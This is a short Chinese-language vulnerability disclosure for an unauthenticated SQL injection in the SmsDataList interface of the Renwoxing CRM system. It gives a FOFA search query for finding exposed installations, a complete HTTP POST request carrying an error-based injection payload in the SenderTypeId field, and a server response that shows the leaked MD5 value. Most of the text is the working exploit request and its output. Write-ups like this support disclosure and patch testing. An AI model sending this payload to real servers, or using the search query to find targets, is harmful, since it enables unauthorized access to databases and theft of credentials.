## 任我行CRM系统存在 SQL注入漏洞

### 漏洞概述

任我行 CRM SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。

### 搜索语法

```
FOFA：“欢迎使用任我行CRM”
```

### 漏洞复现

```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: your-ip
 
Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
```

响应包如下所示，证明存在漏洞。

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 161
Content-Type: application/json; charset=utf-8
Server: WWW Server/1.1
X-AspNetMvc-Version: 4.0
X-Safe-Firewall: zhuji.360.cn 1.0.9.47 F1W1
Date: Tue, 15 Aug 2023 18:24:11 GMT
Connection: close

{"error":{"errorCode":-1,"message":"在将 nvarchar 值 '0xe10adc3949ba59abbe56e057f20f883e' 转换成数据类型 int 时失败。","errorType":1},"value":null}

```

